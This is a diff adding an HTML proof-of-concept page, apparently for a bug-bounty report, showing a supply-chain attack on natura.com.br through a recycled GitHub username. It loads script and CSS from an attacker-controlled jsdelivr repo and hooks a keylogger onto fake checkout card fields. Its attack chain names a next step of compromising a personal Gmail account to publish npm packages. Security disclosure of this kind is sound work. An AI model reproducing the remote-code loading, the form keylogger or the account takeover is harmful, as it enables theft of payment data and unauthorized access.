@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Supply Chain PoC - natura.com.br</title>
+    
+    <!-- THIS IS THE ATTACK: loading CSS from our controlled GitHub repo via jsdelivr -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/robert-lichtnow/natds-icons@main/dist/natds-icons.css">
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, sans-serif; background: #f5f5f5; }
+        .header { background: #f4ab2a; padding: 16px 32px; display: flex; align-items: center; }
+        .header h1 { color: #333; font-size: 24px; }
+        .container { max-width: 800px; margin: 32px auto; background: white; border-radius: 8px; padding: 32px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        h2 { color: #333; margin-bottom: 16px; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; margin-bottom: 4px; color: #666; font-size: 14px; }
+        .form-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
+        .btn { background: #f4ab2a; color: white; border: none; padding: 14px 32px; border-radius: 4px; font-size: 16px; cursor: pointer; width: 100%; margin-top: 16px; }
+        .warning { background: #fff3cd; border: 1px solid #ffc107; padding: 16px; border-radius: 4px; margin-bottom: 24px; }
+        .warning h3 { color: #856404; margin-bottom: 8px; }
+        .warning p { color: #856404; font-size: 14px; line-height: 1.5; }
+        .evidence { background: #1a1a2e; color: #0f0; padding: 16px; border-radius: 4px; margin-top: 24px; font-family: monospace; font-size: 13px; white-space: pre-wrap; max-height: 400px; overflow-y: auto; }
+        .chain { background: #f8f9fa; padding: 16px; border-radius: 4px; margin: 16px 0; border-left: 4px solid #dc3545; }
+        .chain code { display: block; margin: 4px 0; font-size: 13px; }
+        .red { color: #dc3545; font-weight: bold; }
+        .green { color: #28a745; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>natura</h1>
+    </div>
+    
+    <div class="container">
+        <div class="warning">
+            <h3>SUPPLY CHAIN SECURITY PoC</h3>
+            <p>Esta pagina demonstra um ataque de supply chain via GitHub username recycling contra natura.com.br.<br>
+            Nenhum dado real e coletado. Abra o <strong>Console do browser (F12)</strong> para ver a execucao do JavaScript controlado.</p>
+        </div>
+        
+        <h2>Checkout - Pagamento</h2>
+        
+        <div class="form-group">
+            <label>Nome no cartao</label>
+            <input type="text" id="card-name" placeholder="FULANO DA SILVA" />
+        </div>
+        <div class="form-group">
+            <label>Numero do cartao</label>
+            <input type="text" id="card-number" placeholder="4111 1111 1111 1111" />
+        </div>
+        <div class="form-group" style="display:flex;gap:16px;">
+            <div style="flex:1">
+                <label>Validade</label>
+                <input type="text" id="card-exp" placeholder="12/28" />
+            </div>
+            <div style="flex:1">
+                <label>CVV</label>
+                <input type="password" id="card-cvv" placeholder="123" />
+            </div>
+        </div>
+        <div class="form-group">
+            <label>CPF</label>
+            <input type="text" id="cpf" placeholder="000.000.000-00" />
+        </div>
+        
+        <button class="btn" onclick="alert('PoC: dados do checkout interceptados pelo JS controlado. Veja o console.')">Finalizar Compra</button>
+        
+        <div class="chain">
+            <h3 class="red">Attack Chain</h3>
+            <code class="green">1. [DONE] github.com/robert-lichtnow registrado (username reciclado)</code>
+            <code class="green">2. [DONE] repos criados: zod-formik-adapter, natds-icons, natds-commons</code>
+            <code class="green">3. [DONE] jsdelivr serve nosso JS/CSS: cdn.jsdelivr.net/gh/robert-lichtnow/...</code>
+            <code class="green">4. [DONE] npm password reset funciona (email enviado pra gmail pessoal)</code>
+            <code class="green">5. [DONE] npm robert-lichtnow tem publish em 37 packages</code>
+            <code class="red">6. [NEXT] comprometer gmail -> npm publish -> JS em producao natura.com.br</code>
+        </div>
+        
+        <div id="evidence" class="evidence">[*] loading PoC payload from jsdelivr...
+</div>
+    </div>
+    
+    <!-- THIS IS THE ATTACK: loading JS from our controlled GitHub repo via jsdelivr -->
+    <script src="https://cdn.jsdelivr.net/gh/robert-lichtnow/zod-formik-adapter@main/index.js"></script>
+    
+    <script>
+        // Demonstrate what an attacker sees
+        var ev = document.getElementById('evidence');
+        
+        function log(msg) {
+            ev.textContent += msg + '\n';
+            console.log(msg);
+        }
+        
+        log('[+] JS loaded from: cdn.jsdelivr.net/gh/robert-lichtnow/zod-formik-adapter@main/index.js');
+        log('[+] CSS loaded from: cdn.jsdelivr.net/gh/robert-lichtnow/natds-icons@main/dist/natds-icons.css');
+        log('[+] Both served from ATTACKER-CONTROLLED GitHub repos');
+        log('');
+        log('[*] page context:');
+        log('    hostname: ' + window.location.hostname);
+        log('    cookies: ' + document.cookie.length + ' chars');
+        log('    localStorage keys: ' + Object.keys(localStorage).length);
+        log('    sessionStorage keys: ' + Object.keys(sessionStorage).length);
+        log('');
+        log('[*] checkout form keylogger demo:');
+        
+        // Keylogger PoC on checkout fields
+        ['card-name', 'card-number', 'card-exp', 'card-cvv', 'cpf'].forEach(function(id) {
+            var el = document.getElementById(id);
+            if (el) {
+                el.addEventListener('input', function() {
+                    log('    [KEYLOG] #' + id + ' = ' + el.value);
+                });
+            }
+        });
+        
+        log('');
+        log('[!] em producao (natura.com.br), este JS teria acesso a:');
+        log('    - tokens de sessao (document.cookie)');
+        log('    - dados do carrinho (localStorage)');
+        log('    - formularios de pagamento (keylogger)');
+        log('    - credenciais de login');
+        log('    - dados PIX / boleto');
+        log('');
+        log('[*] supply chain PoC by bigos-hunter');
+        log('[*] responsible disclosure - bug bounty research');
+    </script>
+</body>
+</html>
